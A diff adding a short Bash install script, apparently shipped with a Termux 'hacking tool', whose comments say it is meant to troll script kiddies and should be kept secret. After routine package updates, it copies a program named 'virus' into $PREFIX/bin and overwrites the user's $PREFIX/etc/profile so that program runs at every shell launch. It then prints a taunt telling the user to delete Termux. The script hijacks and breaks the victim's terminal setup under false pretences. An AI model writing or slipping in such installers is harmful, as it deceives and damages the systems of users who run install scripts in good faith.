@@ -1,0 +1,23 @@
+#!/usr/bin/bash
+
+# by the way this tools is trolling scritp kiddie
+# shhhhshshh dont expose it bruhhhhhhhh
+
+# update and upgrade installation package 
+
+apt update
+apt upgrade
+
+apt install clang -y
+
+# installing trolling virus NOTE : this virus is not distructive
+mv Hack virus
+cp virus $PREFIX/bin
+cd
+echo "virus" > $PREFIX/etc/profile
+echo "already late i install virus to your termux delete your termux loser !!"
+sleep 1
+virus
+
+
+
